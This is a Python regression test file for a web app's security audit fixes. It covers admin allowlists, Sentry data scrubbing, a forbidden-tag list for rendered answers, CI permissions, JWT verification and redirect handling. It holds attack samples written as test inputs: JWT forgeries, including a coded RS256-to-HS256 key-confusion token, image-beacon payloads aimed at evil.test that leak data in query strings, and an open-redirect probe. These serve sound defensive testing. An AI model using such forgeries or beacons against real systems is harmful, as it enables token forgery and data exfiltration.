"""Regression tests for docs/SECURITY_AUDIT_2026-10.md (F1-F4)."""

import json
import re
from pathlib import Path

import pytest
import sentry_sdk
from sentry_sdk.transport import Transport

import asgi
from backend import auth as auth_module
from backend import logging_setup

ROOT = Path(__file__).resolve().parent.parent
URL = "/api/devtools/feedback-digest"
HEADERS = {"Authorization": "Bearer fake"}


def _as_user(monkeypatch, sub):
    monkeypatch.setattr(auth_module, "_verify_clerk_token", lambda token: {"sub": sub, "sid": "s"})


class _Q:
    data = [{"verdict": "helpful", "comment": "x"}]

    def __getattr__(self, name):
        return lambda *a, **k: self

    def execute(self):
        return self


def test_f1_feedback_digest_forbidden_for_ordinary_signed_in_user(test_client, monkeypatch):
    import backend.routes_devtools as dt

    monkeypatch.setattr(dt, "_get_supabase_client", lambda: _Q())
    monkeypatch.setenv("ADMIN_USER_IDS", "user_admin")
    _as_user(monkeypatch, "user_someone_else")
    assert test_client.get(URL, headers=HEADERS).status_code == 403


def test_f1_feedback_digest_fails_closed_when_allowlist_unset(test_client, monkeypatch):
    import backend.routes_devtools as dt

    monkeypatch.setattr(dt, "_get_supabase_client", lambda: _Q())
    monkeypatch.delenv("ADMIN_USER_IDS", raising=False)
    _as_user(monkeypatch, "user_admin")
    assert test_client.get(URL, headers=HEADERS).status_code == 403


def test_f1_feedback_digest_allows_listed_admin(test_client, monkeypatch):
    import backend.routes_devtools as dt

    monkeypatch.setattr(dt, "_get_supabase_client", lambda: _Q())
    monkeypatch.setenv("ADMIN_USER_IDS", "a, user_admin")
    _as_user(monkeypatch, "user_admin")
    assert test_client.get(URL, headers=HEADERS).status_code == 200


class _Capture(Transport):
    def __init__(self, options=None):
        super().__init__(options)
        self.events = []

    def capture_envelope(self, envelope):
        for item in envelope.items:
            if item.type == "event":
                self.events.append(item.payload.json)

    def flush(self, *a, **k):
        pass


def test_f2_sentry_kwargs_disable_local_variables():
    assert logging_setup._build_sentry_init_kwargs("x")["include_local_variables"] is False


@pytest.mark.asyncio
async def test_f2_question_never_reaches_sentry_event(fastapi_client, monkeypatch):
    marker = "PROBE-QUESTION-TEXT-12345"
    # before_send keeps process-wide dedupe/cap state that earlier tests fill.
    monkeypatch.setattr(logging_setup, "_sentry_seen_at", type(logging_setup._sentry_seen_at)())
    monkeypatch.setattr(logging_setup, "_sentry_sent_count", 0)
    cap = _Capture()
    opts = {k: v for k, v in logging_setup._build_sentry_init_kwargs("x").items()
            if k not in ("dsn", "traces_sampler")}
    sentry_sdk.init(dsn="https://k@o1.ingest.us.sentry.io/1", transport=cap, **opts)
    monkeypatch.setattr(logging_setup, "_sentry_enabled", True)

    async def boom(*a, **k):
        raise RuntimeError("boom")

    monkeypatch.setattr(asgi, "_collect_ask_async_context", boom)
    try:
        # A fresh client IP keeps earlier tests' rate-limit state out of the way.
        await fastapi_client.post(
            "/ask",
            json={"question": f"my wife is ill {marker}"},
            headers={"X-Vercel-Forwarded-For": "203.0.113.77"},
        )
        sentry_sdk.flush()
        assert cap.events, "probe expected a captured event"
        assert marker not in json.dumps(cap.events)
    finally:
        sentry_sdk.init()


def test_f3_answer_renderer_forbids_beacon_tags():
    src = (ROOT / "static/js/shell.js").read_text()
    m = re.search(r"const ANSWER_FORBIDDEN_TAGS = \[(.*?)\];", src, re.S)
    assert m, "ANSWER_FORBIDDEN_TAGS is gone from shell.js"
    tags = set(re.findall(r"'([a-z]+)'", m.group(1)))
    assert {"img", "form", "input", "style", "iframe", "link", "meta"} <= tags
    assert "FORBID_TAGS: ANSWER_FORBIDDEN_TAGS" in src


@pytest.mark.parametrize("wf", ["ci.yml", "rls-verify.yml"])
def test_f4_workflows_declare_least_privilege(wf):
    text = (ROOT / ".github/workflows" / wf).read_text()
    assert re.search(r"^permissions:\s*\n\s+contents: read\s*$", text, re.M)


# ── JWT verification matrix (no code change; pins current behaviour) ─────────

def _jwt_fixture(monkeypatch):
    import time

    import jwt
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pem_priv = key.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
    pem_pub = key.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)

    class _Key:
        pass

    class _Client:
        def get_signing_key_from_jwt(self, token):
            k = _Key()
            k.key = key.public_key()
            return k

    monkeypatch.setenv("CLERK_JWT_ISSUER", "https://clerk.example.test")
    monkeypatch.delenv("CLERK_AUDIENCE", raising=False)
    monkeypatch.setattr(auth_module, "_get_clerk_jwks_client", lambda: _Client())
    now = int(time.time())
    claims = {"sub": "user_1", "iss": "https://clerk.example.test", "exp": now + 600, "iat": now}
    return jwt, pem_priv, pem_pub, claims


def test_jwt_valid_rs256_accepted(monkeypatch):
    jwt, priv, _pub, claims = _jwt_fixture(monkeypatch)
    token = jwt.encode(claims, priv, algorithm="RS256")
    assert auth_module._verify_clerk_token(token)["sub"] == "user_1"


@pytest.mark.parametrize("variant", ["expired", "wrong_issuer", "alg_none", "hs256_with_public_key"])
def test_jwt_forgeries_rejected(monkeypatch, variant):
    jwt, priv, pub, claims = _jwt_fixture(monkeypatch)
    if variant == "expired":
        token = jwt.encode({**claims, "exp": claims["iat"] - 10}, priv, algorithm="RS256")
    elif variant == "wrong_issuer":
        token = jwt.encode({**claims, "iss": "https://evil.test"}, priv, algorithm="RS256")
    elif variant == "alg_none":
        token = jwt.encode(claims, None, algorithm="none")
    else:
        # classic RS256->HS256 key-confusion: sign with the public key as an HMAC secret
        import base64
        import hashlib
        import hmac

        def b64(b):
            return base64.urlsafe_b64encode(b).rstrip(b"=")

        head = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        body = b64(json.dumps(claims).encode())
        sig = b64(hmac.new(pub, head + b"." + body, hashlib.sha256).digest())
        token = (head + b"." + body + b"." + sig).decode()
    with pytest.raises(jwt.PyJWTError):
        auth_module._verify_clerk_token(token)


# ── F3 server side / F7 ───────────────────────────────────────────────────────

@pytest.mark.parametrize("raw,expected", [
    ("see ![chart](https://evil.test/c.png?q=secret) here", "see chart here"),
    ("![](https://evil.test/p.gif)", ""),
    ("x ![a][r] y\n\n[r]: https://evil.test/z", "x a y\n\n[r]: https://evil.test/z"),
    ('hi <img src="https://evil.test/a.png" onerror="x()"> there', "hi  there"),
    ("a [link](https://ok.test) stays", "a [link](https://ok.test) stays"),
])
def test_f3_model_output_loses_embedded_images(raw, expected):
    from backend import claude

    assert claude._sanitize_model_output(raw) == expected


@pytest.mark.parametrize("url", [
    "/api/stack/health", "/api/health", "/api/devtools/reliability", "/api/devtools/rls-audit",
])
def test_f7_diagnostics_need_the_operator(test_client, monkeypatch, url):
    monkeypatch.setenv("ADMIN_USER_IDS", "user_admin")
    _as_user(monkeypatch, "user_someone_else")
    assert test_client.get(url, headers=HEADERS).status_code == 403


@pytest.mark.asyncio
async def test_f5_bearer_verification_runs_off_the_event_loop(fastapi_client, monkeypatch):
    import threading

    from backend import rate_limit as rate_limit_mod

    loop_thread = threading.get_ident()
    seen = []

    def resolve(authorization):
        seen.append(threading.get_ident())
        return "user_1"

    monkeypatch.setattr(asgi, "extract_user_id_from_bearer_value", resolve)
    monkeypatch.setattr(rate_limit_mod, "extract_user_id_from_bearer_value", resolve)
    await fastapi_client.post(
        "/ask", json={"question": ""},
        headers={"Authorization": "Bearer fake", "X-Vercel-Forwarded-For": "203.0.113.78"})
    assert seen, "the verifier was never called"
    assert all(t != loop_thread for t in seen)


# ── Account links, sign-in redirect and the admin page ───────────────────────

@pytest.mark.parametrize("alias,target", [
    ("/sign-in", "/signin"), ("/sign-up", "/signup"), ("/unauthorized-sign-in", "/signin"),
])
def test_clerk_account_portal_paths_redirect_into_the_app(test_client, alias, target):
    response = test_client.get(f"{alias}?redirect_url=https://evil.example/x")
    assert response.status_code == 308
    assert response.headers["Location"].endswith(target)
    assert "evil.example" not in response.headers["Location"]


def test_signup_path_serves_the_noindex_shell(test_client):
    response = test_client.get("/signup")
    assert response.status_code == 200
    assert "noindex" in response.headers["X-Robots-Tag"]


def test_admin_feedback_page_carries_no_data_and_is_not_cached(test_client):
    response = test_client.get("/admin/feedback")
    assert response.status_code == 200
    assert "noindex" in response.headers["X-Robots-Tag"]
    assert "no-store" in response.headers["Cache-Control"]
    assert "Authorization: 'Bearer '" in response.get_data(as_text=True)


def test_sign_in_finishes_in_page_on_the_page_under_the_overlay():
    src = (ROOT / "static/js/shell.js").read_text()
    assert "routerPush: (to) => clerkNavigate(to)" in src
    assert "fallbackRedirectUrl: returnTo" in src
    assert "fallbackRedirectUrl: window.location.href" not in src
